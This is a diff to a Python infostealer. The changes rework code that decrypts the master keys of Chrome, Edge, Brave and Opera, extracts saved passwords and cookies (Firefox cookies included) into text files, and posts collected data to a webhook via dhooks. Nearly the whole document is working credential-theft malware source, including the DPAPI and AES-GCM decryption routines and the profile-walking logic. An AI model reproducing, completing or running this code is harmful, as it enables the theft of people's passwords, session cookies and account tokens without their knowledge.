@@ -1,8 +1,7 @@
 import os
-from re import findall, match
+from re import match
 from json import loads, dumps
 from base64 import b64decode
-from threading import Thread
 import re
 import ntpath
 from urllib.request import Request, urlopen
@@ -10,16 +9,15 @@ import json
 from Crypto.Cipher import AES
 from PIL import ImageGrab
 from sys import argv
-from win32crypt import CryptUnprotectData
-from shutil import copy2
-from sqlite3 import connect
+import win32crypt
+import shutil
+import sqlite3
 import requests
-import getpass
 import psutil
 from dhooks import Webhook, File
 import base64
 
-webhook_url = "your_webhook_url"
+webhook_url = "webhook_url"
 
 try:        
     from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
@@ -60,150 +58,6 @@ def get_size(bytes, suffix="B"):
         if bytes < factor:
             return f"{bytes:.2f}{unit}{suffix}"
         bytes /= factor
-
-f = open(f"{os.environ['USERPROFILE']}\Passwords.txt","a")
-def get_pass():
-    try:
-        def get_master_key():
-            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
-                local_state = f.read()
-                local_state = loads(local_state)
-            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = master_key[5:]  # removing DPAPI
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-            return master_key
-        master_key = get_master_key()
-        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
-        copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-        conn = connect("Loginvault.db")
-        cursor = conn.cursor()
-        try:
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-            for r in cursor.fetchall():
-                url = r[0]
-                username = r[1]
-                encrypted_password = r[2]
-                decrypted_password = decrypt_password(encrypted_password, master_key)
-                with open(f"{os.environ['USERPROFILE']}\Passwords.txt","a") as f:
-                    if url != "" and username != "" and decrypted_password !="":
-                        f.write("URL: " + url + "| USERNAME: " + username + "| PASSWORD: " + decrypted_password + "\n")
-                        f.close()
-        except Exception as e:
-            pass
-        cursor.close()
-        conn.close()
-        try:
-            os.remove(f"Loginvault.db")
-        except Exception as e:
-            pass
-    except FileNotFoundError as e:
-        pass
-    try:
-        def get_master_key():
-            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State', "r", encoding='utf-8') as f:
-                local_state = f.read()
-                local_state = loads(local_state)
-            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = master_key[5:]  # removing DPAPI
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-            return master_key
-        master_key = get_master_key()
-        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data'
-        copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-        conn = connect("Loginvault.db")
-        cursor = conn.cursor()
-        try:
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-            for r in cursor.fetchall():
-                url = r[0]
-                username = r[1]
-                encrypted_password = r[2]
-                decrypted_password = decrypt_password(encrypted_password, master_key)
-                with open(f"{os.environ['USERPROFILE']}\Passwords.txt","a") as f:
-                    if url != "" and username != "" and decrypted_password !="":
-                        f.write("URL: " + url + "| USERNAME: " + username + "| PASSWORD: " + decrypted_password + "\n")
-                        f.close()
-        except Exception as e:
-            pass
-        cursor.close()
-        conn.close()
-        try:
-            os.remove(f"Loginvault.db")
-        except Exception as e:
-            pass
-    except FileNotFoundError as e:
-        pass
-    try:
-        def get_master_key():
-            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State', "r", encoding='utf-8') as f:
-                local_state = f.read()
-                local_state = loads(local_state)
-            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = master_key[5:]  # removing DPAPI
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-            return master_key
-
-        master_key = get_master_key()
-        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Login Data'
-        copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-        conn = connect("Loginvault.db")
-        cursor = conn.cursor()
-        try:
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-            for r in cursor.fetchall():
-                url = r[0]
-                username = r[1]
-                encrypted_password = r[2]
-                decrypted_password = decrypt_password(encrypted_password, master_key)
-                with open(f"{os.environ['USERPROFILE']}\Passwords.txt","a") as f:
-                    if url != "" and username != "" and decrypted_password !="":
-                        f.write("URL: " + url + "| USERNAME: " + username + "| PASSWORD: " + decrypted_password + "\n")
-                        f.close()
-        except Exception as e:
-            pass
-        cursor.close()
-        conn.close()
-        try:
-            os.remove(f"Loginvault.db")
-        except Exception as e:
-            pass
-    except FileNotFoundError as e:
-        pass
-    try:
-        def get_master_key():
-            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
-                local_state = f.read()
-                local_state = loads(local_state)
-            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = master_key[5:]  # removing DPAPI
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-            return master_key
-        master_key = get_master_key()
-        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
-        copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-        conn = connect("Loginvault.db")
-        cursor = conn.cursor()
-        try:
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-            for r in cursor.fetchall():
-                url = r[0]
-                username = r[1]
-                encrypted_password = r[2]
-                decrypted_password = decrypt_password(encrypted_password, master_key)
-                with open(f"{os.environ['USERPROFILE']}\Passwords.txt","a") as f:
-                    if url != "" and username != "" and decrypted_password !="":
-                        f.write("URL: " + url + "| USERNAME: " + username + "| PASSWORD: " + decrypted_password + "\n")
-                        f.close()
-        except Exception as e:
-            pass
-        cursor.close()
-        conn.close()
-        try:
-            os.remove(f"Loginvault.db")
-        except Exception as e:
-            pass
-    except FileNotFoundError as e:
-        pass
 
 def getheaders(token=None, content_type="application/json"):
     headers = {
@@ -348,15 +202,14 @@ tokens = []
 sep = os.sep
 startup = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 chrome = appdata + "\\Google\\Chrome\\User Data\\"
-def get_master_key(path) -> str:
-    with open(path, "r", encoding="utf-8") as f:
-        local_state = f.read()
-    local_state = json.loads(local_state)
-
-    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    master_key = master_key[5:]
-    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-    return master_key
+def get_master_key(ptr):
+     with open(ptr, "r") as f:
+         local_state = f.read()
+         local_state = json.loads(local_state)
+     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+     master_key = master_key[5:]  # removing DPAPI
+     master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+     return master_key
 def decrypt_val(buff, master_key) -> str:
     try:
         iv = buff[3:15]
@@ -554,116 +407,143 @@ def main():
         urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
-USER_NAME = getpass.getuser()
-def grabcookies():
-    f = open(f"{os.environ['USERPROFILE']}\Cookies.txt","a")
-    #chrome
-    try:
-        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
-            local_state = f.read()
-            
-            local_state = loads(local_state)
-            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = master_key[5:]  # removing DPAPI
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-        appdata = os.getenv("localappdata")
-        login_db = appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
+
+with open(f"{os.environ['USERPROFILE']}\Passwords.txt","a") as f:
+    f.write("passwords:\n")
+global user
+user = os.environ.get("USERNAME")
+chromePtr = r'C:\Users\\' + user + r'\AppData\Local\Google\Chrome\User Data\\'
+firePtr = r"C:\Users\\" + user + "\\AppData\Roaming\Mozilla\Firefox\Profiles"
+edgePtr = r'C:\Users\\' + user + r'\AppData\Local\Microsoft\Edge\User Data\\'
+discPtr = r'C:\Users\\' + user + r'\AppData\Roaming\discord\\'
+bravePtr = r'C:\Users\\' + user + r'\AppData\Local\BraveSoftware\Brave-Browser\User Data'
+operaPtr = r'C:\Users\\' + user + r'\AppData\Roaming\Opera Software\Opera Stable\User Data'
+
+
+def locate(ptr):
+    if ptr:
+        for root, dirs, files in os.walk(ptr): # I want every Profile's cookies, just incase...
+            for file in files:
+                if file == 'cookies.sqlite': # Why the hell is FireFox special...
+                    cookie_path = os.path.join(root,file)
+                    parseFirefox(cookie_path)
+                elif file == 'Cookies' and 'Edge' not in ptr:
+                    cookie_path = os.path.join(root,file)
+                    parseDB(cookie_path)
+                elif file == 'Login Data':
+                    pwd_path = os.path.join(root,file)
+                    grabPwd(pwd_path)
+
+def parseFirefox(cookie_path):
+    con = sqlite3.connect(cookie_path)
+    cur = con.cursor()
+    for row in cur.execute('SELECT * FROM moz_cookies'):
+        with open(f"{os.environ['USERPROFILE']}\Cookies.txt","a") as f:
+            f.write(str(row) + "\n")
+    os.remove(r"C:\Users\\" + user + "\Desktop\info.txt")
+
+
+def parseDB(cookie_path):
+    master_key = ""
+    if "Chrome" in cookie_path:
+        master_key = get_master_key(findLocalState(chromePtr))
+    if "Edge" in cookie_path:
+        master_key = get_master_key(findLocalState(edgePtr))
+    if "Brave" in cookie_path:
+        master_key = get_master_key(findLocalState(bravePtr))
+    if "Opera" in cookie_path:
+        master_key = get_master_key(findLocalState(operaPtr))
+    con = sqlite3.connect(cookie_path)
+    cur = con.cursor()
+    with open(f"{os.environ['USERPROFILE']}\Cookies.txt","a", encoding="cp437", errors='ignore') as f:
         try:
-            copy2(login_db, "Loginvault.db")
-        except FileNotFoundError:
-            pass
-        conn = connect("Loginvault.db")
-        cursor = conn.cursor()
-        with open(f"{os.environ['USERPROFILE']}\Cookies.txt","a", encoding="cp437", errors='ignore') as f:
-            try:
-                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
-                for r in cursor.fetchall():
-                    Host = r[0]
-                    user = r[1]
-                    encrypted_cookie = r[2]
-                    decrypted_cookie = decrypt_password(encrypted_cookie, master_key)
-                    if Host != "" and user != "" and decrypted_cookie != "":
-                        f.write(f"HOST KEY: {Host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
-            except:
-                pass
-        cursor.close()
-        conn.close()
-        try:
-            os.remove("Loginvault.db")
+            cur.execute("SELECT host_key, name, encrypted_value from cookies")
+            for r in cur.fetchall():
+                Host = r[0]
+                user = r[1]
+                encrypted_cookie = r[2]
+                decrypted_cookie = decrypt_password(encrypted_cookie, master_key)
+                if Host != "" and user != "" and decrypted_cookie != "":
+                    f.write(f"HOST KEY: {Host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
         except:
             pass
+    cur.close()
+
+def decrypt_payload(cipher, payload):
+     return cipher.decrypt(payload)
+
+def generate_cipher(aes_key, iv):
+     return AES.new(aes_key, AES.MODE_GCM, iv)
+
+def decrypt_password(buff, master_key):
+     try:
+         iv = buff[3:15]
+         payload = buff[15:]
+         cipher = generate_cipher(master_key, iv)
+         decrypted_pass = decrypt_payload(cipher, payload)
+         decrypted_pass = decrypted_pass[:-16].decode()
+         return decrypted_pass
+     except Exception as e:
+         return "Chrome < 80"
+
+def grabPwd(pwd_path):
+    if "Chrome" in pwd_path:
+        master_key = get_master_key(findLocalState(chromePtr))
+    if "Edge" in pwd_path:
+        master_key = get_master_key(findLocalState(edgePtr))
+    if "Brave" in pwd_path:
+        master_key = get_master_key(findLocalState(bravePtr))
+    login_db = pwd_path
+    shutil.copy2(login_db, "Loginvault.db")
+    conn = sqlite3.connect("Loginvault.db")
+    cursor = conn.cursor()
+    try:
+        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+        for r in cursor.fetchall():
+            url = r[0]
+            username = r[1]
+            encrypted_password = r[2]
+            decrypted_password = decrypt_password(encrypted_password, master_key)
+            with open(f"{os.environ['USERPROFILE']}\Passwords.txt","a") as f:
+                if url != "" and username != "" and decrypted_password !="":
+                    f.write("URL: " + url + "| USERNAME: " + username + "| PASSWORD: " + decrypted_password + "\n")
+                    f.close()
+    except Exception as e:
+        pass
+    cursor.close()
+    conn.close()
+    try:
+        os.remove("Loginvault.db")
+    except Exception as e:
+        pass
+
+
+def findLocalState(ptr):
+    for root,dirs,files in os.walk(ptr):
+        for file in files:
+            if file == 'Local State':
+                path = os.path.join(root,file)
+    return path
+
+def start():
+    try:
+        locate(chromePtr)
     except:
         pass
-    #adge
     try:
-        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
-            local_state = f.read()
-            local_state = loads(local_state)
-            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = master_key[5:]  # removing DPAPI
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-        appdata = os.getenv("localappdata")
-        login_db = appdata+'\\Microsoft\\Edge\\User Data\\default\\Network\\cookies'
-        try:
-            copy2(login_db, "Loginvault.db")
-        except FileNotFoundError:
-            pass
-        conn = connect("Loginvault.db")
-        cursor = conn.cursor()
-        with open(f"{os.environ['USERPROFILE']}\Cookies.txt","a", encoding="cp437", errors='ignore') as f:
-            try:
-                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
-                for r in cursor.fetchall():
-                    Host = r[0]
-                    user = r[1]
-                    encrypted_cookie = r[2]
-                    decrypted_cookie = decrypt_password(encrypted_cookie, master_key)
-                    if Host != "" and user != "" and decrypted_cookie != "":
-                        f.write(f"HOST KEY: {Host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
-            except:
-                pass
-        cursor.close()
-        conn.close()
-        try:
-            os.remove("Loginvault.db")
-        except:
-            pass
+        locate(edgePtr)
     except:
         pass
-    #opera
     try:
-        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State', "r", encoding='utf-8') as f:
-            local_state = f.read()
-            local_state = loads(local_state)
-            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = master_key[5:]  # removing DPAPI
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-        appdata = os.getenv("localappdata")
-        login_db = appdata+'\\Opera Software\\Opera Stable\\User Data\\default\\Network\\cookies'
-        try:
-            copy2(login_db, "Loginvault.db")
-        except FileNotFoundError:
-            pass
-        conn = connect("Loginvault.db")
-        cursor = conn.cursor()
-        with open(f"{os.environ['USERPROFILE']}\Cookies.txt","a", encoding="cp437", errors='ignore') as f:
-            try:
-                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
-                for r in cursor.fetchall():
-                    Host = r[0]
-                    user = r[1]
-                    encrypted_cookie = r[2]
-                    decrypted_cookie = decrypt_password(encrypted_cookie, master_key)
-                    if Host != "" and user != "" and decrypted_cookie != "":
-                        f.write(f"HOST KEY: {Host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
-            except:
-                pass
-        cursor.close()
-        conn.close()
-        try:
-            os.remove("Loginvault.db")
-        except:
-            pass
+        locate(firePtr)
+    except:
+        pass
+    try:
+        locate(bravePtr)
+    except:
+        pass
+    try:
+        locate(operaPtr)
     except:
         pass
 
@@ -693,11 +573,7 @@ if __name__ == "__main__":
     except:
         pass
     try:
-        get_pass()
-    except:
-        pass
-    try:
-        grabcookies()
+        start()
     except:
         pass
     try:
